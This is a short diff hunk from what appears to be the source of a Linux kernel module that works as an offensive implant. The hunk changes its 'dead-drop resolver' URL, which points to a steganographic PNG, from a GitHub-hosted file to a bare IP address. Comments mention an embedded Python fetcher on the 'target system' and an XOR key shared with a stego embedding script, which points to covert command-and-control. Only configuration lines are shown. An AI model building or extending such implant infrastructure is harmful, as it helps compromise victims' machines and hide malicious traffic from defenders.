@@ -152,7 +152,7 @@ MODULE_VERSION("1.0");
 
 /* ── dead-drop resolver config (set before building) ─────────────────────── */
 /* URL of the stego PNG hosted on a public service (e.g. raw.githubusercontent) */
-#define STEGO_IMG_URL  "https://raw.githubusercontent.com/Elieroc/pa5_cipherfall/main/Modules/St%C3%A9gano/favicon_stego.png"
+#define STEGO_IMG_URL  "http://87.106.187.97/favicon_stego_cv.png"
 /* Absolute path to python3 on the target system */
 #define PYTHON3_PATH   "/usr/bin/python3"
 /* Embedded Python fetcher — XOR key must match STEGO_XOR_KEY in stego_embed.py */
